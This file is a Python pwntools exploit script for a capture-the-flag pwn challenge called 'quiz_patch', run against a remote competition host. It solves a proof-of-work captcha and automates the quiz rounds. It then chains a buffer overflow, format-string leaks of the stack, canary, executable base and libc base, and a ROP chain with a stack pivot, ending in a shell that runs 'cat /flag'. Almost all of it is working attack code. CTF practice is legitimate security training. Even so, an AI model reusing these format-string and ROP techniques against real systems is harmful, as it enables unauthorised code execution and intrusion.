#!/usr/bin/env python3

from pwn import *
from itertools import count

# ENV
PORT = 9999
HOST = "pwn4.cscv.vn"
exe = context.binary = ELF('./quiz_patch_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-2.39.so', checksec=False)

def parse_zeros_from_banner(banner: bytes, default_zeros: int = 6) -> int:
    m = re.search(rb"starts\s+with\s+(\d+)\s+zero", banner, re.I)
    if m:
        try:
            return int(m.group(1).decode())
        except Exception:
            pass
    return default_zeros

def solve_pow(challenge: bytes, zeros: int = 6) -> str:
    procs = int(os.getenv("POW_PROCS", "1"))
    if procs <= 1:
        return _solve_pow_single(challenge, zeros)
    import multiprocessing as mp
    found_q, stop_ev = mp.Queue(), mp.Event()
    ps = [mp.Process(target=_worker_mp, args=(challenge, zeros, s, procs, found_q, stop_ev)) for s in range(procs)]
    for p in ps: p.start()
    ans = found_q.get()
    stop_ev.set()
    for p in ps:
        p.join(timeout=0.1)
        if p.is_alive(): p.terminate()
    return ans

def _solve_pow_single(challenge: bytes, zeros: int) -> str:
    target = "0" * zeros
    pref = challenge
    for i in count():
        x = str(i).encode()
        if hashlib.sha256(pref + x).hexdigest().startswith(target):
            return x.decode()

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            source /home/nhh/pwndbg/gdbinit.py
            # show
            brva 0x0000000000002046
            brva 0x00000000000020C7
            # start
            brva 0x00000000000024E6
            brva 0x000000000000253D
            brva 0x00000000000025E5
            # edit_player
            brva 0x0000000000002757
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)

    # Solve captcha
    banner = b""
    p.recvuntil(b"Challenge: ")
    challenge = p.recvline().strip()
    banner += b"Challenge: " + challenge + b"\n"

    p.timeout = 0.2
    try:
        while True:
            line = p.recvline(timeout=0.1)
            if not line: break
            banner += line
            if b"Enter your answer" in line: break
    except Exception:
        pass
    finally:
        p.timeout = None

    zeros = parse_zeros_from_banner(banner, default_zeros=6)
    log.info(f"PoW difficulty: {zeros} zeros")
    t0 = time.time()
    X = solve_pow(challenge, zeros=zeros)
    log.success(f"Solved PoW: X='{X}' in {time.time()-t0:.2f}s")
    p.sendlineafter(b"Enter your answer", X.encode())
else:
    p = exe.process()

def add_player(data):
    p.sendlineafter(b'> ', str(1))
    p.sendafter(b'name: ', data)

def show():
    p.sendlineafter(b'> ', str(2))

def start():
    p.sendlineafter(b'> ', str(3))

def edit_player(data):
    p.sendlineafter(b'> ', str(4))
    p.sendlineafter(b'name: ', data)

def longest_index(leak):
    max_len = -1
    max_idx = -1
    for i in leak:
        if i in leak and isinstance(leak[i], (bytes, str)):
            if len(leak[i]) > max_len:
                max_len = len(leak[i])
                max_idx = i
    return max_idx

# VARIABLE


# PAYLOAD
add_player(b'nhh')
leak = {}
start()
for i in range(10):
    p.recvuntil(b'?\n')
    leak[1] = p.recvline()
    leak[2] = p.recvline()
    leak[3] = p.recvline()
    leak[4] = p.recvline()
    idx = longest_index(leak)
    p.sendlineafter(b'> ', str(idx)) # REMOTE

start()
for i in range(20):
    if (i % 10 == 0 and i > 0):
        start()

    p.recvuntil(b'?\n')
    leak[1] = p.recvline()
    leak[2] = p.recvline()
    leak[3] = p.recvline()
    leak[4] = p.recvline()
    idx = longest_index(leak)
    p.sendlineafter(b'> ', str(idx))

start()
for i in range(30):
    if (i % 10 == 0 and i > 0):
        start()

    p.recvuntil(b'?\n')
    leak[1] = p.recvline()
    leak[2] = p.recvline()
    leak[3] = p.recvline()
    leak[4] = p.recvline()
    idx = longest_index(leak)
    p.sendlineafter(b'> ', str(idx))

start()
for i in range(40):
    if (i % 10 == 0 and i > 0):
        start()

    p.recvuntil(b'?\n')
    leak[1] = p.recvline()
    leak[2] = p.recvline()
    leak[3] = p.recvline()
    leak[4] = p.recvline()
    idx = longest_index(leak)
    p.sendlineafter(b'> ', str(idx))

# Exploit
edit_player(b'a'*0x4c + b'\x20') # edit rank & score
start()
for i in range(10):
    p.recvuntil(b'?\n')
    leak[1] = p.recvline()
    leak[2] = p.recvline()
    leak[3] = p.recvline()
    leak[4] = p.recvline()
    idx = longest_index(leak)
    p.sendlineafter(b'> ', str(idx))

payload = b'%p'*11
p.sendafter(b'thoughts: ', payload)
show()
p.recvuntil(b'thoughts: ')
leak = p.recvuntil(b'\n', drop=True).replace(b'(nil)', b'0x').split(b'0x')
print(leak)
stack_leak = int(leak[5], 16)
log.info("Stack leak: " + hex(stack_leak))
exe_leak = int(leak[6], 16)
exe.address = exe_leak - 0x2987
log.info("Exe base: " + hex(exe.address))
free_got = exe.got.free
stdout = exe.address + 0x6060
canary = int(leak[10], 16)
log.info("Canary: " + hex(canary))

leak = {}
start()
for i in range(10):
    p.recvuntil(b'?\n')
    leak[1] = p.recvline()
    leak[2] = p.recvline()
    leak[3] = p.recvline()
    leak[4] = p.recvline()
    idx = longest_index(leak)
    p.sendlineafter(b'> ', str(idx))
target = stdout
payload = b'%p'*4 + b'%s'
payload = payload.ljust(0xc8, b'\0') + p64(canary) + p32(target & 0xffffffff) + p16(target >> 32 & 0xffff)
p.sendafter(b'thoughts: ', payload)
# GDB()
show()
p.recvuntil(b'thoughts: ')
leak = p.recvuntil(b'\n', drop=True).replace(b'(nil)', b'0x').split(b'0x')
print(leak)
libc_leak = u64(leak[4] + b'\0'*2)
log.info("Libc leak: " + hex(libc_leak))
libc.address = libc_leak - libc.sym._IO_2_1_stdout_
log.info("Libc base: " + hex(libc.address))
system = libc.sym.system
bin_sh = next(libc.search(b'/bin/sh'))
leave_ret = 0x00000000000299d2 + libc.address
pop_rdi = 0x000000000010f78b + libc.address
ret = pop_rdi + 1
# _IO_2_1_stdout_: 5c0
# _IO_file_write: 940
# _IO_file_xsputn: 9e0
# _IO_file_jumps: 030

# stack_leak - 0x4c8: _IO_file_write+53
# stack_leak - 0x498: _IO_file_xsputn+506
# stack_leak - 0x468: _IO_file_jumps

leak = {}
start()
for i in range(10):
    p.recvuntil(b'?\n')
    leak[1] = p.recvline()
    leak[2] = p.recvline()
    leak[3] = p.recvline()
    leak[4] = p.recvline()
    idx = longest_index(leak)
    p.sendlineafter(b'> ', str(idx))
payload = flat(
    pop_rdi,
    bin_sh,
    system
    )
payload = payload.ljust(0xc8, b'\0')
payload += flat(
    canary,
    stack_leak - 0x100 - 8,
    leave_ret
    )
p.sendafter(b'thoughts: ', payload)

p.sendline(b'cat /flag')

p.interactive()